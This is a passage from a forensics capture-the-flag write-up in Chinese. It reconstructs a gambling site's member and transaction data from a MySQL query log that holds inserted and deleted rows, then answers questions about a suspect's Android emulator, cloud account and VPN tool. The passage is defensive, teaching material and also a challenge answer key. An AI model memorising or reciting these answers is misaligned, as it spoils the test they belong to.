`id` = 999\n2022-10-19T03:16:37.191203Z	   13 Query	DELETE FROM `b1`.`member` WHERE `id` = 1000\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>逻辑：需要在日志中找到被删除的原数据，然后找到member_guild_id=3的用户数量，再加上158</p><div class="language-MYSQL line-numbers-mode" data-ext="MYSQL"><pre class="language-MYSQL"><code>2022-10-19T03:12:07.961675Z	   12 Query	INSERT INTO `member` VALUES (973, NULL, NULL, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 0, 0, NULL, 0, NULL, NULL, 0, NULL, NULL, 0, NULL, NULL, NULL, &#39;中国&#39;, NULL, NULL, 0, 0, NULL, 0, &#39;13532680973&#39;, &#39;ee455f8f8e5d321861ed7ef5bde6dbc5&#39;, &#39;U000001Lo973&#39;, 1, NULL, 0, &#39;2022-10-18 13:4:24&#39;, &#39;353233323433333238363833323439363634&#39;, 0, b&#39;1&#39;, 0, 0, &#39;c3d54ed7-b20f-430b-8f9a-b517c1973&#39;, &#39;2022-10-18 13:4:24&#39;, 1, NULL, 0, &#39;13532680973&#39;, NULL, NULL, &#39;中国&#39;, 0, 3, 0, 0, NULL)\n2022-10-19T03:12:07.968287Z	   12 Query	INSERT INTO `member` VALUES (974, NULL, NULL, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 0, 0, NULL, 0, NULL, NULL, 0, NULL, NULL, 0, NULL, NULL, NULL, &#39;中国&#39;, NULL, NULL, 0, 0, NULL, 0, &#39;13176680974&#39;, &#39;ee455f8f8e5d321861ed7ef5bde6dbc5&#39;, &#39;U000001Lo974&#39;, 1, NULL, 0, &#39;2022-10-18 14:14:4&#39;, &#39;353233323433333238363833323439363634&#39;, 0, b&#39;1&#39;, 0, 0, &#39;c3d54ed7-b20f-430b-8f9a-b517c1974&#39;, &#39;2022-10-18 14:14:4&#39;, 1, NULL, 0, &#39;13176680974&#39;, NULL, NULL, &#39;中国&#39;, 0, 5, 0, 0, NULL)\n2022-10-19T03:12:07.974085Z	   12 Query	INSERT INTO `member` VALUES (975, NULL, NULL, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 0, 0, NULL, 0, NULL, NULL, 0, NULL, NULL, 0, NULL, NULL, NULL, &#39;中国&#39;, NULL, NULL, 0, 0, NULL, 0, &#39;13530690975&#39;, &#39;ee455f8f8e5d321861ed7ef5bde6dbc5&#39;, &#39;U000001Lo975&#39;, 1, NULL, 0, &#39;2022-10-18 15:23:44&#39;, &#39;353233323433333238363833323439363634&#39;, 0, b&#39;1&#39;, 0, 0, &#39;c3d54ed7-b20f-430b-8f9a-b517c1975&#39;, &#39;2022-10-18 15:23:44&#39;, 1, NULL, 0, &#39;13530690975&#39;, NULL, NULL, &#39;中国&#39;, 0, 3, 0, 0, NULL)\n2022-10-19T03:12:07.979831Z	   12 Query	INSERT INTO `member` VALUES (976, NULL, NULL, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 0, 0, NULL, 0, NULL, NULL, 0, NULL, NULL, 0, NULL, NULL, NULL, &#39;中国&#39;, NULL, NULL, 0, 0, NULL, 0, &#39;13942370976&#39;, &#39;ee455f8f8e5d321861ed7ef5bde6dbc5&#39;, &#39;U000001Lo976&#39;, 1, NULL, 0, &#39;2022-10-18 16:33:24&#39;, &#39;353233323433333238363833323439363634&#39;, 0, b&#39;1&#39;, 0, 0, &#39;c3d54ed7-b20f-430b-8f9a-b517c1976&#39;, &#39;2022-10-18 16:33:24&#39;, 1, NULL, 0, &#39;13942370976&#39;, NULL, NULL, &#39;中国&#39;, 0, 1, 0, 0, NULL)\n2022-10-19T03:12:07.985614Z	   12 Query	INSERT INTO `member` VALUES (977, NULL, NULL, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 0, 0, NULL, 0, NULL, NULL, 0, NULL, NULL, 0, NULL, NULL, NULL, &#39;中国&#39;, NULL, NULL, 0, 0, NULL, 0, &#39;13486370977&#39;, &#39;ee455f8f8e5d321861ed7ef5bde6dbc5&#39;, &#39;U000001Lo977&#39;, 1, NULL, 0, &#39;2022-10-18 13:4:43&#39;, &#39;353233323433333238363833323439363634&#39;, 0, b&#39;1&#39;, 0, 0, &#39;c3d54ed7-b20f-430b-8f9a-b517c1977&#39;, &#39;2022-10-18 13:4:43&#39;, 1, NULL, 0, &#39;13486370977&#39;, NULL, NULL, &#39;中国&#39;, 0, 5, 0, 0, NULL)\n2022-10-19T03:12:07.991726Z	   12 Query	INSERT INTO `member` VALUES (978, NULL, NULL, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 0, 0, NULL, 0, NULL, NULL, 0, NULL, NULL, 0, NULL, NULL, NULL, &#39;中国&#39;, NULL, NULL, 0, 0, NULL, 0, &#39;13840370978&#39;, &#39;ee455f8f8e5d321861ed7ef5bde6dbc5&#39;, &#39;U000001Lo978&#39;, 1, NULL, 0, &#39;2022-10-18 14:14:23&#39;, &#39;353233323433333238363833323439363634&#39;, 0, b&#39;1&#39;, 0, 0, &#39;c3d54ed7-b20f-430b-8f9a-b517c1978&#39;, &#39;2022-10-18 14:14:23&#39;, 1, NULL, 0, &#39;13840370978&#39;, NULL, NULL, &#39;中国&#39;, 0, 3, 0, 0, NULL)\n2022-10-19T03:12:07.996485Z	   12 Query	INSERT INTO `member` VALUES (979, NULL, NULL, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 0, 0, NULL, 0, NULL, NULL, 0, NULL, NULL, 0, NULL, NULL, NULL, &#39;中国&#39;, NULL, NULL, 0, 0, NULL, 0, &#39;13384370979&#39;, &#39;ee455f8f8e5d321861ed7ef5bde6dbc5&#39;, &#39;U000001Lo979&#39;, 1, NULL, 0, &#39;2022-10-18 15:24:3&#39;, &#39;353233323433333238363833323439363634&#39;, 0, b&#39;1&#39;, 0, 0, &#39;c3d54ed7-b20f-430b-8f9a-b517c1979&#39;, &#39;2022-10-18 15:24:3&#39;, 1, NULL, 0, &#39;13384370979&#39;, NULL, NULL, &#39;中国&#39;, 0, 1, 0, 0, NULL)\n2022-10-19T03:12:08.002778Z	   12 Query	INSERT INTO `member` VALUES (980, NULL, NULL, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 0, 0, NULL, 0, NULL, NULL, 0, NULL, NULL, 0, NULL, NULL, NULL, &#39;中国&#39;, NULL, NULL, 0, 0, NULL, 0, &#39;13738370980&#39;, &#39;ee455f8f8e5d321861ed7ef5bde6dbc5&#39;, &#39;U000001Lo980&#39;, 1, NULL, 0, &#39;2022-10-18 16:33:43&#39;, &#39;353233323433333238363833323439363634&#39;, 0, b&#39;1&#39;, 0, 0, &#39;c3d54ed7-b20f-430b-8f9a-b517c1980&#39;, &#39;2022-10-18 16:33:43&#39;, 1, NULL, 0, &#39;13738370980&#39;, NULL, NULL, &#39;中国&#39;, 0, 5, 0, 0, NULL)\n2022-10-19T03:12:08.008331Z	   12 Query	INSERT INTO `member` VALUES (981, NULL, NULL, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 0, 0, NULL, 0, NULL, NULL, 0, NULL, NULL, 0, NULL, NULL, NULL, &#39;中国&#39;, NULL, NULL, 0, 0, NULL, 0, &#39;13282380981&#39;, &#39;ee455f8f8e5d321861ed7ef5bde6dbc5&#39;, &#39;U000001Lo981&#39;, 1, NULL, 0, &#39;2022-10-18 13:15:36&#39;, &#39;353233323433333238363833323439363634&#39;, 0, b&#39;1&#39;, 0, 0, &#39;c3d54ed7-b20f-430b-8f9a-b517c1981&#39;, &#39;2022-10-18 13:15:36&#39;, 1, NULL, 0, &#39;13282380981&#39;, NULL, NULL, &#39;中国&#39;, 0, 3, 0, 0, NULL)\n2022-10-19T03:12:08.013494Z	   12 Query	INSERT INTO `member` VALUES (982, NULL, NULL, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 0, 0, NULL, 0, NULL, NULL, 0, NULL, NULL, 0, NULL, NULL, NULL, &#39;中国&#39;, NULL, NULL, 0, 0, NULL, 0, &#39;13736380982&#39;, &#39;ee455f8f8e5d321861ed7ef5bde6dbc5&#39;, &#39;U000001Lo982&#39;, 1, NULL, 0, &#39;2022-10-18 14:25:16&#39;, &#39;353233323433333238363833323439363634&#39;, 0, b&#39;1&#39;, 0, 0, &#39;c3d54ed7-b20f-430b-8f9a-b517c1982&#39;, &#39;2022-10-18 14:25:16&#39;, 1, NULL, 0, &#39;13736380982&#39;, NULL, NULL, &#39;中国&#39;, 0, 5, 0, 0, NULL)\n2022-10-19T03:12:08.019163Z	   12 Query	INSERT INTO `member` VALUES (983, NULL, NULL, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 0, 0, NULL, 0, NULL, NULL, 0, NULL, NULL, 0, NULL, NULL, NULL, &#39;中国&#39;, NULL, NULL, 0, 0, NULL, 0, &#39;13248060983&#39;, &#39;ee455f8f8e5d321861ed7ef5bde6dbc5&#39;, &#39;U000001Lo983&#39;, 1, NULL, 0, &#39;2022-10-18 15:34:56&#39;, &#39;353233323433333238363833323439363634&#39;, 0, b&#39;1&#39;, 0, 0, &#39;c3d54ed7-b20f-430b-8f9a-b517c1983&#39;, &#39;2022-10-18 15:34:56&#39;, 1, NULL, 0, &#39;13248060983&#39;, NULL, NULL, &#39;中国&#39;, 0, 3, 0, 0, NULL)\n2022-10-19T03:12:08.023970Z	   12 Query	INSERT INTO `member` VALUES (984, NULL, NULL, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 0, 0, NULL, 0, NULL, NULL, 0, NULL, NULL, 0, NULL, NULL, NULL, &#39;中国&#39;, NULL, NULL, 0, 0, NULL, 0, &#39;13692060984&#39;, &#39;ee455f8f8e5d321861ed7ef5bde6dbc5&#39;, &#39;U000001Lo984&#39;, 1, NULL, 0, &#39;2022-10-18 16:44:36&#39;, &#39;353233323433333238363833323439363634&#39;, 0, b&#39;1&#39;, 0, 0, &#39;c3d54ed7-b20f-430b-8f9a-b517c1984&#39;, &#39;2022-10-18 16:44:36&#39;, 1, NULL, 0, &#39;13692060984&#39;, NULL, NULL, &#39;中国&#39;, 0, 1, 0, 0, NULL)\n2022-10-19T03:12:08.030725Z	   12 Query	INSERT INTO `member` VALUES (985, NULL, NULL, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 0, 0, NULL, 0, NULL, NULL, 0, NULL, NULL, 0, NULL, NULL, NULL, &#39;中国&#39;, NULL, NULL, 0, 0, NULL, 0, &#39;13146060985&#39;, &#39;ee455f8f8e5d321861ed7ef5bde6dbc5&#39;, &#39;U000001Lo985&#39;, 1, NULL, 0, &#39;2022-10-18 13:15:55&#39;, &#39;353233323433333238363833323439363634&#39;, 0, b&#39;1&#39;, 0, 0, &#39;c3d54ed7-b20f-430b-8f9a-b517c1985&#39;, &#39;2022-10-18 13:15:55&#39;, 1, NULL, 0, &#39;13146060985&#39;, NULL, NULL, &#39;中国&#39;, 0, 5, 0, 0, NULL)\n2022-10-19T03:12:08.035551Z	   12 Query	INSERT INTO `member` VALUES (986, NULL, NULL, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 0, 0, NULL, 0, NULL, NULL, 0, NULL, NULL, 0, NULL, NULL, NULL, &#39;中国&#39;, NULL, NULL, 0, 0, NULL, 0, &#39;13590070986&#39;, &#39;ee455f8f8e5d321861ed7ef5bde6dbc5&#39;, &#39;U000001Lo986&#39;, 1, NULL, 0, &#39;2022-10-18 14:25:34&#39;, &#39;353233323433333238363833323439363634&#39;, 0, b&#39;1&#39;, 0, 0, &#39;c3d54ed7-b20f-430b-8f9a-b517c1986&#39;, &#39;2022-10-18 14:25:34&#39;, 1, NULL, 0, &#39;13590070986&#39;, NULL, NULL, &#39;中国&#39;, 0, 3, 0, 0, NULL)\n2022-10-19T03:12:08.040445Z	   12 Query	INSERT INTO `member` VALUES (987, NULL, NULL, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 0, 0, NULL, 0, NULL, NULL, 0, NULL, NULL, 0, NULL, NULL, NULL, &#39;中国&#39;, NULL, NULL, 0, 0, NULL, 0, &#39;13844070987&#39;, &#39;ee455f8f8e5d321861ed7ef5bde6dbc5&#39;, &#39;U000001Lo987&#39;, 1, NULL, 0, &#39;2022-10-18 15:35:14&#39;, &#39;353233323433333238363833323439363634&#39;, 0, b&#39;1&#39;, 0, 0, &#39;c3d54ed7-b20f-430b-8f9a-b517c1987&#39;, &#39;2022-10-18 15:35:14&#39;, 1, NULL, 0, &#39;13844070987&#39;, NULL, NULL, &#39;中国&#39;, 0, 6, 0, 0, NULL)\n2022-10-19T03:12:08.048228Z	   12 Query	INSERT INTO `member` VALUES (988, NULL, NULL, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 0, 0, NULL, 0, NULL, NULL, 0, NULL, NULL, 0, NULL, NULL, NULL, &#39;中国&#39;, NULL, NULL, 0, 0, NULL, 0, &#39;13388070988&#39;, &#39;ee455f8f8e5d321861ed7ef5bde6dbc5&#39;, &#39;U000001Lo988&#39;, 1, NULL, 0, &#39;2022-10-18 16:44:54&#39;, &#39;353233323433333238363833323439363634&#39;, 0, b&#39;1&#39;, 0, 0, &#39;c3d54ed7-b20f-430b-8f9a-b517c1988&#39;, &#39;2022-10-18 16:44:54&#39;, 1, NULL, 0, &#39;13388070988&#39;, NULL, NULL, &#39;中国&#39;, 0, 4, 0, 0, NULL)\n2022-10-19T03:12:08.053610Z	   12 Query	INSERT INTO `member` VALUES (989, NULL, NULL, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 0, 0, NULL, 0, NULL, NULL, 0, NULL, NULL, 0, NULL, NULL, NULL, &#39;中国&#39;, NULL, NULL, 0, 0, NULL, 0, &#39;13742070989&#39;, &#39;ee455f8f8e5d321861ed7ef5bde6dbc5&#39;, &#39;U000001Lo989&#39;, 1, NULL, 0, &#39;2022-10-18 13:26:47&#39;, &#39;353233323433333238363833323439363634&#39;, 0, b&#39;1&#39;, 0, 0, &#39;c3d54ed7-b20f-430b-8f9a-b517c1989&#39;, &#39;2022-10-18 13:26:47&#39;, 1, NULL, 0, &#39;13742070989&#39;, NULL, NULL, &#39;中国&#39;, 0, 2, 0, 0, NULL)\n2022-10-19T03:12:08.058670Z	   12 Query	INSERT INTO `member` VALUES (990, NULL, NULL, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 0, 0, NULL, 0, NULL, NULL, 0, NULL, NULL, 0, NULL, NULL, NULL, &#39;中国&#39;, NULL, NULL, 0, 0, NULL, 0, &#39;13353750990&#39;, &#39;ee455f8f8e5d321861ed7ef5bde6dbc5&#39;, &#39;U000001Lo990&#39;, 1, NULL, 0, &#39;2022-10-18 14:36:27&#39;, &#39;353233323433333238363833323439363634&#39;, 0, b&#39;1&#39;, 0, 0, &#39;c3d54ed7-b20f-430b-8f9a-b517c1990&#39;, &#39;2022-10-18 14:36:27&#39;, 1, NULL, 0, &#39;13353750990&#39;, NULL, NULL, &#39;中国&#39;, 0, 4, 0, 0, NULL)\n2022-10-19T03:12:08.066046Z	   12 Query	INSERT INTO `member` VALUES (991, NULL, NULL, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 0, 0, NULL, 0, NULL, NULL, 0, NULL, NULL, 0, NULL, NULL, NULL, &#39;中国&#39;, NULL, NULL, 0, 0, NULL, 0, &#39;13797750991&#39;, &#39;ee455f8f8e5d321861ed7ef5bde6dbc5&#39;, &#39;U000001Lo991&#39;, 1, NULL, 0, &#39;2022-10-18 15:46:7&#39;, &#39;353233323433333238363833323439363634&#39;, 0, b&#39;1&#39;, 0, 0, &#39;c3d54ed7-b20f-430b-8f9a-b517c1991&#39;, &#39;2022-10-18 15:46:7&#39;, 1, NULL, 0, &#39;13797750991&#39;, NULL, NULL, &#39;中国&#39;, 0, 2, 0, 0, NULL)\n2022-10-19T03:12:08.070986Z	   12 Query	INSERT INTO `member` VALUES (992, NULL, NULL, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 0, 0, NULL, 0, NULL, NULL, 0, NULL, NULL, 0, NULL, NULL, NULL, &#39;中国&#39;, NULL, NULL, 0, 0, NULL, 0, &#39;13251760992&#39;, &#39;ee455f8f8e5d321861ed7ef5bde6dbc5&#39;, &#39;U000001Lo992&#39;, 1, NULL, 0, &#39;2022-10-18 16:55:47&#39;, &#39;353233323433333238363833323439363634&#39;, 0, b&#39;1&#39;, 0, 0, &#39;c3d54ed7-b20f-430b-8f9a-b517c1992&#39;, &#39;2022-10-18 16:55:47&#39;, 1, NULL, 0, &#39;13251760992&#39;, NULL, NULL, &#39;中国&#39;, 0, 6, 0, 0, NULL)\n2022-10-19T03:12:08.076234Z	   12 Query	INSERT INTO `member` VALUES (993, NULL, NULL, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 0, 0, NULL, 0, NULL, NULL, 0, NULL, NULL, 0, NULL, NULL, NULL, &#39;中国&#39;, NULL, NULL, 0, 0, NULL, 0, &#39;13695760993&#39;, &#39;ee455f8f8e5d321861ed7ef5bde6dbc5&#39;, &#39;U000001Lo993&#39;, 1, NULL, 0, &#39;2022-10-18 13:27:6&#39;, &#39;353233323433333238363833323439363634&#39;, 0, b&#39;1&#39;, 0, 0, &#39;c3d54ed7-b20f-430b-8f9a-b517c1993&#39;, &#39;2022-10-18 13:27:6&#39;, 1, NULL, 0, &#39;13695760993&#39;, NULL, NULL, &#39;中国&#39;, 0, 4, 0, 0, NULL)\n2022-10-19T03:12:08.081554Z	   12 Query	INSERT INTO `member` VALUES (994, NULL, NULL, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 0, 0, NULL, 0, NULL, NULL, 0, NULL, NULL, 0, NULL, NULL, NULL, &#39;中国&#39;, NULL, NULL, 0, 0, NULL, 0, &#39;13149760994&#39;, &#39;ee455f8f8e5d321861ed7ef5bde6dbc5&#39;, &#39;U000001Lo994&#39;, 1, NULL, 0, &#39;2022-10-18 14:36:46&#39;, &#39;353233323433333238363833323439363634&#39;, 0, b&#39;1&#39;, 0, 0, &#39;c3d54ed7-b20f-430b-8f9a-b517c1994&#39;, &#39;2022-10-18 14:36:46&#39;, 1, NULL, 0, &#39;13149760994&#39;, NULL, NULL, &#39;中国&#39;, 0, 2, 0, 0, NULL)\n2022-10-19T03:12:08.086191Z	   12 Query	INSERT INTO `member` VALUES (995, NULL, NULL, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 0, 0, NULL, 0, NULL, NULL, 0, NULL, NULL, 0, NULL, NULL, NULL, &#39;中国&#39;, NULL, NULL, 0, 0, NULL, 0, &#39;13593760995&#39;, &#39;ee455f8f8e5d321861ed7ef5bde6dbc5&#39;, &#39;U000001Lo995&#39;, 1, NULL, 0, &#39;2022-10-18 15:46:26&#39;, &#39;353233323433333238363833323439363634&#39;, 0, b&#39;1&#39;, 0, 0, &#39;c3d54ed7-b20f-430b-8f9a-b517c1995&#39;, &#39;2022-10-18 15:46:26&#39;, 1, NULL, 0, &#39;13593760995&#39;, NULL, NULL, &#39;中国&#39;, 0, 6, 0, 0, NULL)\n2022-10-19T03:12:08.091434Z	   12 Query	INSERT INTO `member` VALUES (996, NULL, NULL, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 0, 0, NULL, 0, NULL, NULL, 0, NULL, NULL, 0, NULL, NULL, NULL, &#39;中国&#39;, NULL, NULL, 0, 0, NULL, 0, &#39;13947760996&#39;, &#39;ee455f8f8e5d321861ed7ef5bde6dbc5&#39;, &#39;U000001Lo996&#39;, 1, NULL, 0, &#39;2022-10-18 16:56:6&#39;, &#39;353233323433333238363833323439363634&#39;, 0, b&#39;1&#39;, 0, 0, &#39;c3d54ed7-b20f-430b-8f9a-b517c1996&#39;, &#39;2022-10-18 16:56:6&#39;, 1, NULL, 0, &#39;13947760996&#39;, NULL, NULL, &#39;中国&#39;, 0, 4, 0, 0, NULL)\n2022-10-19T03:12:08.097094Z	   12 Query	INSERT INTO `member` VALUES (997, NULL, NULL, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 0, 0, NULL, 0, NULL, NULL, 0, NULL, NULL, 0, NULL, NULL, NULL, &#39;中国&#39;, NULL, NULL, 0, 0, NULL, 0, &#39;13459440997&#39;, &#39;ee455f8f8e5d321861ed7ef5bde6dbc5&#39;, &#39;U000001Lo997&#39;, 1, NULL, 0, &#39;2022-10-18 13:37:59&#39;, &#39;353233323433333238363833323439363634&#39;, 0, b&#39;1&#39;, 0, 0, &#39;c3d54ed7-b20f-430b-8f9a-b517c1997&#39;, &#39;2022-10-18 13:37:59&#39;, 1, NULL, 0, &#39;13459440997&#39;, NULL, NULL, &#39;中国&#39;, 0, 6, 0, 0, NULL)\n2022-10-19T03:12:08.101734Z	   12 Query	INSERT INTO `member` VALUES (998, NULL, NULL, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 0, 0, NULL, 0, NULL, NULL, 0, NULL, NULL, 0, NULL, NULL, NULL, &#39;中国&#39;, NULL, NULL, 0, 0, NULL, 0, &#39;13913450998&#39;, &#39;ee455f8f8e5d321861ed7ef5bde6dbc5&#39;, &#39;U000001Lo998&#39;, 1, NULL, 0, &#39;2022-10-18 14:47:39&#39;, &#39;353233323433333238363833323439363634&#39;, 0, b&#39;1&#39;, 0, 0, &#39;c3d54ed7-b20f-430b-8f9a-b517c1998&#39;, &#39;2022-10-18 14:47:39&#39;, 1, NULL, 0, &#39;13913450998&#39;, NULL, NULL, &#39;中国&#39;, 0, 4, 0, 0, NULL)\n2022-10-19T03:12:08.108159Z	   12 Query	INSERT INTO `member` VALUES (999, NULL, NULL, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 0, 0, NULL, 0, NULL, NULL, 0, NULL, NULL, 0, NULL, NULL, NULL, &#39;中国&#39;, NULL, NULL, 0, 0, NULL, 0, &#39;13457450999&#39;, &#39;ee455f8f8e5d321861ed7ef5bde6dbc5&#39;, &#39;U000001Lo999&#39;, 1, NULL, 0, &#39;2022-10-18 15:57:19&#39;, &#39;353233323433333238363833323439363634&#39;, 0, b&#39;1&#39;, 0, 0, &#39;c3d54ed7-b20f-430b-8f9a-b517c1999&#39;, &#39;2022-10-18 15:57:19&#39;, 1, NULL, 0, &#39;13457450999&#39;, NULL, NULL, &#39;中国&#39;, 0, 2, 0, 0, NULL)\n2022-10-19T03:12:08.113211Z	   12 Query	INSERT INTO `member` VALUES (1000, NULL, NULL, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 0, 0, NULL, 0, NULL, NULL, 0, NULL, NULL, 0, NULL, NULL, NULL, &#39;中国&#39;, NULL, NULL, 0, 0, NULL, 0, &#39;13811451000&#39;, &#39;ee455f8f8e5d321861ed7ef5bde6dbc5&#39;, &#39;U000001Lo1000&#39;, 1, NULL, 0, &#39;2022-10-18 17:6:59&#39;, &#39;353233323433333238363833323439363634&#39;, 0, b&#39;1&#39;, 0, 0, &#39;c3d54ed7-b20f-430b-8f9a-b517c11000&#39;, &#39;2022-10-18 17:6:59&#39;, 1, NULL, 0, &#39;13811451000&#39;, NULL, NULL, &#39;中国&#39;, 0, 6, 0, 0, NULL)\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://didctf-blog-post.oss-cn-beijing.aliyuncs.com/post/image-20221101131437204.png" alt="image-20221101131437204" tabindex="0" loading="lazy"><figcaption>image-20221101131437204</figcaption></figure><p>再把这6个人加上，所以一共是158+6=164人</p><h3 id="_30-还原全部被删改数据-哪些用户id没有充值记录" tabindex="-1"><a class="header-anchor" href="#_30-还原全部被删改数据-哪些用户id没有充值记录" aria-hidden="true">#</a> 30. 还原全部被删改数据，哪些用户ID没有充值记录</h3><p>在<code>membet_transaction</code>中找到充值记录</p><p>然后使用查询语句，发现有2个人没有充值(当然也可以用Excel删除重复值)</p><div class="language-mysql line-numbers-mode" data-ext="mysql"><pre class="language-mysql"><code>SELECT member_id , COUNT(id),SUM(amount) FROM member_transaction GROUP BY member_id\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><figure><img src="https://didctf-blog-post.oss-cn-beijing.aliyuncs.com/post/image-20221101132128845.png" alt="image-20221101132128845" tabindex="0" loading="lazy"><figcaption>image-20221101132128845</figcaption></figure><h4 id="方法一-5" tabindex="-1"><a class="header-anchor" href="#方法一-5" aria-hidden="true">#</a> 方法一</h4><p>导入Excel中，看从哪里开始，Excel的行数和数值不一样了。</p><figure><img src="https://didctf-blog-post.oss-cn-beijing.aliyuncs.com/post/image-20221101132333636.png" alt="image-20221101132333636" tabindex="0" loading="lazy"><figcaption>image-20221101132333636</figcaption></figure><figure><img src="https://didctf-blog-post.oss-cn-beijing.aliyuncs.com/post/image-20221101132443286.png" alt="image-20221101132443286" tabindex="0" loading="lazy"><figcaption>image-20221101132443286</figcaption></figure><h4 id="方法二-5" tabindex="-1"><a class="header-anchor" href="#方法二-5" aria-hidden="true">#</a> 方法二</h4><p><code>member_wallet</code>中的<code>balance</code>就是他的充值记录，找到为0的就是没有充值的。</p><figure><img src="https://didctf-blog-post.oss-cn-beijing.aliyuncs.com/post/image-20221101132735075.png" alt="image-20221101132735075" tabindex="0" loading="lazy"><figcaption>image-20221101132735075</figcaption></figure><h3 id="_31-还原全部被删改数据-2022年10月17日总计产生多少笔交易记录" tabindex="-1"><a class="header-anchor" href="#_31-还原全部被删改数据-2022年10月17日总计产生多少笔交易记录" aria-hidden="true">#</a> 31. 还原全部被删改数据，2022年10月17日总计产生多少笔交易记录？</h3><p>直接使用语句查询</p><div class="language-mysql line-numbers-mode" data-ext="mysql"><pre class="language-mysql"><code>SELECT * FROM `member_transaction` WHERE create_time BETWEEN &quot;2022-10-17  00:00:00&quot; AND &quot;2022-10-17 23:59:59&quot;\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><figure><img src="https://didctf-blog-post.oss-cn-beijing.aliyuncs.com/post/image-20221101133059205.png" alt="image-20221101133059205" tabindex="0" loading="lazy"><figcaption>image-20221101133059205</figcaption></figure><h3 id="_32-还原全部被删改数据-该网站中充值的usdt总额为" tabindex="-1"><a class="header-anchor" href="#_32-还原全部被删改数据-该网站中充值的usdt总额为" aria-hidden="true">#</a> 32. 还原全部被删改数据，该网站中充值的USDT总额为</h3><div class="language-mysql line-numbers-mode" data-ext="mysql"><pre class="language-mysql"><code>SELECT SUM(amount) FROM member_transaction\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><figure><img src="https://didctf-blog-post.oss-cn-beijing.aliyuncs.com/post/image-20221101133542896.png" alt="image-20221101133542896" tabindex="0" loading="lazy"><figcaption>image-20221101133542896</figcaption></figure><h2 id="检材四" tabindex="-1"><a class="header-anchor" href="#检材四" aria-hidden="true">#</a> 检材四</h2><p>根据前期侦查分析，通过技术手段找到了幕后老板，并对其使用的安卓模拟器“检材4”进行了固定。分析所有掌握的检材，回答下列问题</p><p>修改文件为zip，然后打开发现vmdk文件，导入火眼中分析</p><h3 id="_33-嫌疑人使用的安卓模拟器软件名称是" tabindex="-1"><a class="header-anchor" href="#_33-嫌疑人使用的安卓模拟器软件名称是" aria-hidden="true">#</a> 33. 嫌疑人使用的安卓模拟器软件名称是</h3><p>搜索npbk文件，发现是夜神模拟器</p><figure><img src="https://didctf-blog-post.oss-cn-beijing.aliyuncs.com/post/image-20221101135221865.png" alt="image-20221101135221865" tabindex="0" loading="lazy"><figcaption>image-20221101135221865</figcaption></figure><h3 id="_34-检材4中-老板-的阿里云账号是" tabindex="-1"><a class="header-anchor" href="#_34-检材4中-老板-的阿里云账号是" aria-hidden="true">#</a> 34. 检材4中，“老板”的阿里云账号是</h3><figure><img src="https://didctf-blog-post.oss-cn-beijing.aliyuncs.com/post/image-20221101135452879.png" alt="image-20221101135452879" tabindex="0" loading="lazy"><figcaption>image-20221101135452879</figcaption></figure><h3 id="_35-检材4中安装的vpn工具的软件名称是" tabindex="-1"><a class="header-anchor" href="#_35-检材4中安装的vpn工具的软件名称是" aria-hidden="true">#</a> 35.检材4中安装的VPN工具的软件名称是</h3><p>使用火眼直接分析得到</p><figure><img src="https://didctf-blog-post.oss-cn-beijing.aliyuncs.com/post/image-20221101135257781.png" alt="image-20221101135257781" tabindex="0" loading="lazy"><figcaption>image-20221101135257781</figcaption></figure><figure><img src="https://didctf-blog-post.oss-cn-beijing.aliyuncs.com/post/image-20221101135908455.png" alt="image-20221101135908455" tabindex="0" loading="lazy"><figcaption>image-20221101135908455</figcaption></figure><h3 